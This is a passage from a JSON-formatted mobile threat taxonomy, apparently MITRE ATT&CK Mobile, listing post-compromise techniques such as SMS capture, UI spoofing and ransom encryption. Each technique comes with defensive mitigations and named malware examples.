                {
                    "Mitigation": "Application Developer Guidance",
                    "Description": "Application developers should be discouraged from writing sensitive data to the system log in production apps."
                },
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Starting in Android 4.1, this technique requires privilege escalation for malicious applications to perform, as apps can no longer access the system log (other than log entries added by a particular app itself). (Additionally, with physical access to the device, the system log could be accessed via USB through the Android Debug Bridge.)[1]"
                }
            ]
        },
        "Access Sensitive Data or Credentials in Files": {
            "Name": "Access Sensitive Data or Credentials in Files",
            "Description": "An adversary could attempt to read files that contain sensitive data or credentials (e.g., private keys, passwords, access tokens). This technique requires either escalated privileges or for the targeted app to have stored the data in an insecure manner (e.g., with insecure file permissions or in an insecure location such as an external storage directory).\n",
            "ID": "T1409",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "AUT-0",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Ensure that applications do not store sensitive data or credentials insecurely (e.g., with insecure file permissions or in an insecure location such as external data storage)."
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Device Provided Credential Storage",
                    "Description": "Android and iOS provide hardware-backed capabilities to store credentials in an isolated location where they are less likely to be compromised even in the case of a successful privilege escalation attack against the operating system."
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Android 7 provides stronger default file permissions over application internal data storage directories, decreasing the likelihood that insecure file permissions can be exploited."
                }
            ],
            "Examples": [
                {
                    "Name": "Gooligan",
                    "Description": "Gooligan steals authentication tokens that can be used to access data from multiple Google applications.[1]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android accesses sensitive data in files, such as messages stored by the WhatsApp, Facebook, and Twitter applications. It also has the ability to access arbitrary filenames and retrieve directory listings.[2]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS accesses sensitive data in files, such as saving Skype calls by reading them out of the Skype database files.[3]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can collect passwords for Wi-Fi networks and online accounts, including Skype, Facebook, Twitter, Google, WhatsApp, Mail, and LinkedIn.[4]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree has a capability to obtain files from other installed applications.[5]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer exfiltrates data from over 40 apps such as WeChat, Facebook, WhatsApp, Skype, and others.[6]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT can copy files from the device to the C2 server.[7]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango exfiltrated data, including sensitive letters/documents, stored photos, and stored audio files.[8]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo accesses databases from WhatsApp, Viber, Skype, and Line. It also accesses browser history, pictures, and videos.[8]"
                }
            ]
        },
        "Android Intent Hijacking": {
            "Name": "Android Intent Hijacking",
            "Description": "A malicious app can register to receive intents meant for other applications and may then be able to receive sensitive values such as OAuth authorization codes as described in  [1].\n",
            "ID": "T1416",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Credential Access",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "When vetting applications for potential security weaknesses, the vetting process could look for insecure use of intents. Developers should be encouraged to use techniques to ensure that the intent can only be sent to an appropriate destination (e.g., use explicit rather than implicit intents, permission checking, checking of the destination app's signing certificate, or the App Links feature added in Android 6.0). For mobile applications using OAuth, encourage use of the best practices described in the IETF draft \"OAuth 2.0 for Native Apps\".[2][3]"
                }
            ]
        },
        "Capture Clipboard Data": {
            "Name": "Capture Clipboard Data",
            "Description": "A malicious app or other attack vector could capture sensitive data stored in the device clipboard, for example passwords being copy-and-pasted from a password manager app.\n",
            "ID": "T1414",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-35",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can monitor clipboard content.[1]"
                },
                {
                    "Name": "XcodeGhost",
                    "Description": "XcodeGhost can read and write data in the user’s clipboard.[2]"
                }
            ]
        },
        "Capture SMS Messages": {
            "Name": "Capture SMS Messages",
            "Description": "A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.On Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.On iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.\n",
            "ID": "T1412",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Enterprises performing application vetting could search for applications that declare the RECEIVE_SMS permission and scrutinize them closely."
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Adups",
                    "Description": "Adups transmitted the full contents of text messages.[1]"
                },
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A stole SMS message content.[2]"
                },
                {
                    "Name": "AndroRAT",
                    "Description": "AndroRAT captures SMS messages.[3]"
                },
                {
                    "Name": "DroidJack",
                    "Description": "DroidJack RAT captures SMS data.[4]"
                },
                {
                    "Name": "MazarBOT",
                    "Description": "MazarBOT can intercept two-factor authentication codes sent by online banking apps.[5]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS captures SMS messages that the victim sends or receives.[6]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can collect SMS, MMS, and Gmail messages.[7]"
                },
                {
                    "Name": "RuMMS",
                    "Description": "RuMMS uploads incoming SMS messages to a remote command and control server.[8]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer harvests SMS and MMS messages from victims..[9]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT can read SMS messages.[10]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads SMS logs and deletes incoming messages from specified numbers, including those that contain particular strings.[11]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo contains functionality to gather SMS messages.[11]"
                },
                {
                    "Name": "Xbot",
                    "Description": "Xbot steals all SMS message and contact information as well as intercepts and parses certain SMS messages.[12]"
                },
                {
                    "Name": "XLoader",
                    "Description": "XLoader collects SMS messages.[13]"
                }
            ]
        },
        "Malicious Third Party Keyboard App": {
            "Name": "Malicious Third Party Keyboard App",
            "Description": "A malicious app can register as a device keyboard and intercept keypresses containing sensitive values such as usernames and passwords. Zeltser [1] describes these risks.Both iOS and Android require the user to explicitly authorize use of third party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested.\n",
            "ID": "T1417",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "It is rare for apps to register themselves as a device keyboard. Apps that do so should be closely scrutinized during the vetting process."
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "Both iOS and Android require the user to explicitly authorize use of third party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested."
                }
            ]
        },
        "Network Traffic Capture or Redirection": {
            "Name": "Network Traffic Capture or Redirection",
            "Description": "An adversary may capture network traffic to and from the device to obtain credentials or other sensitive data, or redirect network traffic to flow through an adversary-controlled gateway to do the same.A malicious app could register itself as a VPN client on Android or iOS to gain access to network packets. However, on both platforms, the user must grant consent to the app to act as a VPN client, and on iOS the app requires a special entitlement that must be granted by Apple.Alternatively, if a malicious app is able to escalate operating system privileges, it may be able to use those privileges to gain access to network traffic.An adversary could redirect network traffic to an adversary-controlled gateway by establishing a VPN connection or by manipulating the device's proxy settings. For example, Skycure [1] describes the ability to redirect network traffic by installing a malicious iOS Configuration Profile.If applications encrypt their network traffic, sensitive data may not be accessible to an adversary, depending on the point of capture.\n",
            "ID": "T1410",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Closely scrutinize applications that request VPN access before allowing their use."
                },
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": "This mitigation may not always be effective depending on the method used to encrypt network traffic. In some cases, an adversary may be able to capture traffic before it is encrypted."
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "KeyRaider",
                    "Description": "Most KeyRaider samples hook SSLRead and SSLWrite functions in the itunesstored process to intercept device communication with the Apple App Store.[2]"
                }
            ]
        },
        "URL Scheme Hijacking": {
            "Name": "URL Scheme Hijacking",
            "Description": "An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept calls that are meant for a different application. This technique, for example, could be used to capture OAuth authorization codes as described in  [1] or to phish user credentials as described in  [2]. Related potential security implications are described in  [3]. FireEye researchers describe URL scheme hijacking in a blog post [4], including evidence of its use.\n",
            "ID": "T1415",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Credential Access",
            "Platform: ": "iOS",
            "MTC ID: ": "AUT-10",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Check for potential malicious definitions of URL schemes when vetting applications. Also, when examining apps for potential vulnerabilities, encourage use of universal links as an alternative to URL schemes. When examining apps that use OAuth, encourage use of the best practices described in the IETF draft \"OAuth 2.0 for Native Apps\".[5][6]"
                }
            ]
        },
        "User Interface Spoofing": {
            "Name": "User Interface Spoofing",
            "Description": "User Interface Spoofing can be used to trick users into providing sensitive information, such as account credentials, bank account information, or Personally Identifiable Information (PII) to an unintended entity.At least three methods exist to perform User Interface Spoofing:First, on both Android and iOS, an adversary could impersonate the user interface of a legitimate app or device function to trick a user into entering sensitive information. The constrained display size of mobile devices (compared to traditional PC displays) may impair the ability to provide the user with contextual information (for example, displaying a full web site address) that may alert the user to a potential issue. [1] As described by PRE-ATT&CK (Spearphishing for information), it is also possible for an adversary to carry out this form of the technique without a direct adversary presence on the mobile devices, e.g. through a spoofed web page.Second, on both Android and iOS, a malicious app could impersonate the identity of another app (e.g. use the same app name and/or icon) and somehow get installed on the device (e.g. using Deliver Malicious App via Authorized App Store or Deliver Malicious App via Other Means. The malicious app could then prompt the user for sensitive information. [2]Third, on older versions of Android, a malicious app could abuse mobile operating system features to interfere with a running legitimate app. [1] [3] However, this technique appears to have been addressed starting in Android 5.0 with the deprecation of the Android's ActivityManager.getRunningTasks method and modification of its behavior [4] and further addressed in Android 5.1.1 [5] to prevent a malicious app from determining what app is currently in the foreground.\n",
            "ID": "T1411",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Credential Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-31",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Android Overlay Malware",
                    "Description": "Android Overlay Malware used view overlay techniques to present credential input UIs to trick users into providing their banking credentials.[6]"
                },
                {
                    "Name": "Marcher",
                    "Description": "Marcher attempts to overlay itself on top of legitimate banking apps in an effort to capture user credentials. Marcher also attempts to overlay itself on top of legitimate apps such as the Google Play Store in an effort to capture user credit card information.[7]"
                },
                {
                    "Name": "Xbot",
                    "Description": "Xbot uses phishing pages mimicking Google Play's payment interface as well as bank login pages.[8]"
                },
                {
                    "Name": "XcodeGhost",
                    "Description": "XcodeGhost can prompt a fake alert dialog to phish user credentials.[9]"
                }
            ]
        },
        "Device Type Discovery": {
            "Name": "Device Type Discovery",
            "Description": "On Android, device type information is accessible to apps through the android.os.Build class [1]. Device information could be used to target privilege escalation exploits.\n",
            "ID": "T1419",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "App vetting procedures can search for apps that use the android.os.Build class, but these procedures could potentially be evaded and are likely not practical in this case, as many apps are likely to use this functionality as part of their legitimate behavior."
                }
            ],
            "Examples": [
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A gathered device data including phone number, OS version, phone model, and SDK version.[2]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop exfiltrates details of the victim device operating system and manufacturer.[3]"
                }
            ]
        },
        "File and Directory Discovery": {
            "Name": "File and Directory Discovery",
            "Description": "On Android, command line tools or the Java file APIs can be used to enumerate file system contents. However, Linux file permissions and SELinux policies generally strongly restrict what can be accessed by apps (without taking advantage of a privilege escalation exploit). The contents of the external storage directory are generally visible, which could present concern if sensitive data is inappropriately stored there.iOS's security architecture generally restricts the ability to perform file and directory discovery without use of escalated privileges.\n",
            "ID": "T1420",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Increase difficulty of escalating privileges, as security architecture improvements in each new version of Android and iOS make it more difficult to escalate privileges. Additionally, newer versions of Android have strengthened the sandboxing applied to applications, restricting their ability to enumerate file system contents."
                }
            ]
        },
        "Local Network Configuration Discovery": {
            "Name": "Local Network Configuration Discovery",
            "Description": "On Android, details of onboard network interfaces are accessible to apps through the java.net.NetworkInterface class [1]. The Android TelephonyManager class can be used to gather related information such as the IMSI, IMEI, and phone number [2].\n",
            "ID": "T1422",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting could be used to analyze applications to determine whether they access this information, including determining whether the application requests the Android ACCESS_NETWORK_STATE permission (required in order to access NetworkInterface information) or the READ_PHONE_STATE permission (required in order to access TelephonyManager information)."
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Starting in Android 6.0, applications can no longer access MAC addresses of network interfaces.[11]"
                }
            ],
            "Examples": [
                {
                    "Name": "DualToy",
                    "Description": "DualToy collects the connected iOS device’s information including IMEI, IMSI, ICCID, serial number and phone number.[3]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android checks if the device is on Wi-Fi, a cellular network, and is roaming.[4]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS monitors the connection state and tracks which types of networks the phone is connected to, potentially to determine the bandwidth and ability to send full data across the network.[5]"
                },
                {
                    "Name": "PJApps",
                    "Description": "PJApps has the capability to collect and leak the victim's phone number, mobile device unique identifier (IMEI).[6]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop exfiltrates IMEI, IMSI, MNC, MCC, nearby WiFi networks, and other device and SIM related info.[7]"
                },
                {
                    "Name": "RuMMS",
                    "Description": "RuMMS gathers the device phone number and IMEI and transmits them to a command and control server.[8]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer harvests phone number IMEI, and IMSI.[9]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads information about changes in SIM card or phone numbers on the device.[10]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo contains functionality to gather cellular IDs.[10]"
                }
            ]
        },
        "Local Network Connections Discovery": {
            "Name": "Local Network Connections Discovery",
            "Description": "On Android, applications can use standard APIs to gather a list of network connections to and from the device. For example, the Network Connections app available in the Google Play Store [1] advertises this functionality.\n",
            "ID": "T1421",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "During application vetting, applications could be examined to see if they have this behavior, and extra scrutiny could potentially be given to applications that do."
                }
            ]
        },
        "Network Service Scanning": {
            "Name": "Network Service Scanning",
            "Description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).\n",
            "ID": "T1423",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android, iOS",
            "Version": "1.0"
        },
        "Process Discovery": {
            "Name": "Process Discovery",
            "Description": "On Android versions prior to 5, applications can observe information about other processes that are running through methods in the ActivityManager class. On Android versions prior to 7, applications can obtain this information by executing the ps command, or by examining the /proc directory. Starting in Android version 7, use of the Linux kernel's hidepid feature prevents applications (without escalated privileges) from accessing this information [1].\n",
            "ID": "T1424",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting techniques could be used to attempt to identify applications with this behavior."
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "As stated in the technical description, Android 7 and above prevent applications from accessing this information."
                }
            ]
        },
        "System Information Discovery": {
            "Name": "System Information Discovery",
            "Description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, and architecture.On Android, much of this information is programmatically accessible to applications through the android.os.Build class [1].On iOS, techniques exist for applications to programmatically access this information, for example as described in  [2].\n",
            "ID": "T1426",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Discovery",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "KeyRaider",
                    "Description": "Most KeyRaider samples search to find the Apple account's username, password and device's GUID in data being transferred.[3]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS monitors the victim for status and disables other access to the phone by other jailbreaking software.[4]"
                },
                {
                    "Name": "RuMMS",
                    "Description": "RuMMS gathers device model and operating system version information and transmits it to a command and control server.[5]"
                }
            ]
        },
        "Attack PC via USB Connection": {
            "Name": "Attack PC via USB Connection",
            "Description": "With escalated privileges, an adversary could program the mobile device to impersonate USB devices such as input devices (keyboard and mouse), storage devices, and/or networking devices in order to attack a physically connected PC. Wang and Stavrou [1] and Kamkar [2] describe this technique. This technique has been demonstrated on Android, and we are unaware of any demonstrations on iOS.\n",
            "ID": "T1427",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Lateral Movement",
            "Platform: ": "Android",
            "MTC ID: ": "PHY-2",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "Advise users to only connect mobile devices to PCs when a justified need exists (e.g., mobile app development and debugging)."
                }
            ]
        },
        "Exploit Enterprise Resources": {
            "Name": "Exploit Enterprise Resources",
            "Description": "Adversaries may attempt to exploit enterprise servers, workstations, or other resources over the network. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).\n",
            "ID": "T1428",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Lateral Movement",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-32",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "DressCode",
                    "Description": "DressCode sets up a \"general purpose tunnel\" that can be used by an adversary to compromise enterprise networks that the mobile device is connected to.[1]"
                },
                {
                    "Name": "NotCompatible",
                    "Description": "NotCompatible has the capability to exploit systems on an enterprise network.[2]"
                }
            ]
        },
        "Encrypt Files for Ransom": {
            "Name": "Encrypt Files for Ransom",
            "Description": "An adversary may encrypt files stored on the mobile device to prevent the user from accessing them, only unlocking access to the files after a ransom is paid. Without escalated privileges, the adversary is generally limited to only encrypting files in external/shared storage locations. This technique has been demonstrated on Android, and we are unaware of any demonstrated use on iOS.\n",
            "ID": "T1471",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android",
            "MTC ID: ": "APP-28",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Maggi and Zanero describe a static analysis approach that may be able to identify ransomware apps that encrypt user files on the device.[2]"
                }
            ],
            "Examples": [
                {
                    "Name": "Xbot",
                    "Description": "Xbot can encrypt the victim's files in external storage (e.g., SD card) and then request a PayPal cash card as ransom.[1]"
                }
            ]
        },
        "Generate Fraudulent Advertising Revenue": {
            "Name": "Generate Fraudulent Advertising Revenue",
            "Description": "An adversary could seek to generate fraudulent advertising revenue from mobile devices, for example by triggering automatic clicks of advertising links without user involvement.\n",
            "ID": "T1472",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Gooligan",
                    "Description": "Gooligan can install adware to generate revenue.[1]"
                },
                {
                    "Name": "HummingBad",
                    "Description": "In July 2016, HummingBad generated more than $300,000 per month in revenue from installing fraudulent apps and displaying malicious advertisements.[2]"
                },
                {
                    "Name": "HummingWhale",
                    "Description": "HummingWhale generates revenue by displaying fraudulent ads and automatically installing apps. When victims try to close the ads, HummingWhale runs in a virtual machine, creating a fake ID that allows the perpetrators to generate revenue.[3]"
                },
                {
                    "Name": "Judy",
                    "Description": "Judy uses infected devices to generate fraudulent clicks on advertisements to generate revenue.[4]"
                }
            ]
        },
        "Lock User Out of Device": {
            "Name": "Lock User Out of Device",
            "Description": "An adversary may seek to lock the legitimate user out of the device, for example until a ransom is paid.On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode to lock the user out of the device.On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode, they cannot set a new passcode. However, on jailbroken devices, malware has been demonstrated that can lock the user out of the device [1].\n",
            "ID": "T1446",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-28",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "It is rare for applications to utilize Device Administrator access. App vetting can detect apps that do so, and those apps should be closely scrutinized. Maggi and Zanero4 describe a static analysis approach that can be used to identify ransomware apps including apps that abuse Device Administrator access.[4]"
                },
                {
                    "Mitigation": "Caution with Device Administrator Access",
                    "Description": ""
                },
                {
                    "Mitigation": "Deploy Compromised Device Detection Method",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Charger",
                    "Description": "Charger locks the device if it is granted admin permissions, displaying a message demanding a \"ransom\" payment.[2]"
                },
                {
                    "Name": "KeyRaider",
                    "Description": "KeyRaider has built-in functionality to lock victims out of devices and hold them for ransom.[1]"
                },
                {
                    "Name": "Xbot",
                    "Description": "Xbot can remotely lock infected Android devices and ask for a ransom.[3]"
                }
            ]
        },
        "Manipulate App Store Rankings or Ratings": {
            "Name": "Manipulate App Store Rankings or Ratings",
            "Description": "An adversary could use access to a compromised device's credentials to attempt to manipulate app store rankings or ratings by triggering application downloads or posting fake reviews of applications. This technique likely requires privileged access (a rooted or jailbroken device).\n",
            "ID": "T1452",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BrainTest",
                    "Description": "BrainTest provided capabilities that allowed developers to use compromised devices to post positive reviews on their own malicious applications as well as download other malicious applications they had submitted to the Play Store.[1]"
                },
                {
                    "Name": "HummingBad",
                    "Description": "HummingBad can create fraudulent statistics inside the official Google Play Store.[2]"
                }
            ]
        },
        "Premium SMS Toll Fraud": {
            "Name": "Premium SMS Toll Fraud",
            "Description": "A malicious app could use standard Android APIs to send SMS messages. SMS messages could potentially be sent to premium numbers that charge the device owner and generate revenue for an adversary, for example as described by Lookout in  [1].On iOS, apps cannot send SMS messages.On Android, apps must hold the SEND_SMS permission to send SMS messages. Additionally, Android version 4.2 and above has mitigations against this threat by requiring user consent before allowing SMS messages to be sent to premium numbers [2].\n",
            "ID": "T1448",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "As described in Google's Android Security 2014 Year in Review Report, starting with Android 4.2 the user must provide consent before applications can send SMS messages to premium numbers.[2]"
                }
            ],
            "Examples": [
                {
                    "Name": "MazarBOT",
                    "Description": "MazarBOT can send messages to premium-rate numbers.[3]"
                },
                {
                    "Name": "PJApps",
                    "Description": "PJApps has the capability to send messages to premium SMS messages.[4]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop tricks the user into sending SMS messages to premium services and then deletes those messages.[5]"
                }
            ]
        },
        "Wipe Device Data": {
            "Name": "Wipe Device Data",
            "Description": "A malicious application could abuse Android device administrator access to wipe device contents, for example if a ransom is not paid.\n",
            "ID": "T1447",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Effects",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                },
                {
                    "Mitigation": "Caution with Device Administrator Access",
                    "Description": ""
                }
            ]
        },
        "Access Calendar Entries": {
            "Name": "Access Calendar Entries",
            "Description": "An adversary could call standard operating system APIs from a malicious application to gather calendar entry data, or with escalated privileges could directly access files containing calendar data.\n",
            "ID": "T1435",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-13",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "On Android, accessing device calendar data requires that the app hold the READ_CALENDAR permission. Apps that request this permission could be closely scrutinized to ensure that the request is appropriate. On iOS, the app vetting process can determine whether apps access device calendar data, with extra scrutiny applied to any that do so."
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android accesses calendar entries.[1]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads calendar events and reminders.[2]"
                }
            ]
        },
        "Access Call Log": {
            "Name": "Access Call Log",
            "Description": "On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.On iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.\n",
            "ID": "T1433",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-13",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "On Android, accessing the device call log requires that the app hold the READ_CALL_LOG permission. Apps that request this permission could be closely scrutinized to ensure that the request is appropriate."
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": "Decrease likelihood of successful privilege escalation attack."
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Decrease likelihood of successful privilege escalation attack."
                }
            ],
            "Examples": [
                {
                    "Name": "Adups",
                    "Description": "Adups transmitted call logs.[1]"
                },
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A stole call logs.[2]"
                },
                {
                    "Name": "AndroRAT",
                    "Description": "AndroRAT collects call logs.[3]"
                },
                {
                    "Name": "DroidJack",
                    "Description": "DroidJack RAT captures call data.[4]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android accesses call logs.[5]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS captures call logs.[6]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer harvests phone call history from victims..[7]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads call logs.[8]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo contains functionality to gather call logs.[8]"
                }
            ]
        },
        "Access Contact List": {
            "Name": "Access Contact List",
            "Description": "An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.\n",
            "ID": "T1432",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-13",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "On Android, accessing the device contact list requires that the app hold the READ_CONTACTS permission. Apps that request this permission could be closely scrutinized to ensure that the request is appropriate. On iOS, the app vetting process can determine whether apps access the device contact list, with extra scrutiny applied to any that do so."
                }
            ],
            "Examples": [
                {
                    "Name": "Adups",
                    "Description": "Adups transmitted contact lists.[1]"
                },
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A stole contact list data stored both on the the phone and the SIM card.[2]"
                },
